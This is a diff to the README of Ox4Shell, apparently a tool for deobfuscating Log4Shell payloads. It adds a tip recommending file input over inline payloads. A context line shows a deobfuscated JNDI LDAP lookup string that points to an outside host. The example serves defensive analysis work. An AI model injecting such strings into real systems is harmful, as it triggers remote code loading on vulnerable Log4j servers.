@@ -27,6 +27,8 @@ After running Ox4Shell, it would transform into an intuitive and readable form:
 ${jndi:ldap://1.1.1.1:3890/Calc$cz3z]Y_pWxAoLPWh}
 ```
 
+⚠️ We recommend running `Ox4Shell` with a provided file (`-f`) rather than an inline payload (`-p`), because certain 
+shell environments will escape important characters, therefore will yield inaccurate results. 
 
 ## Usage
 To run the tool simply:
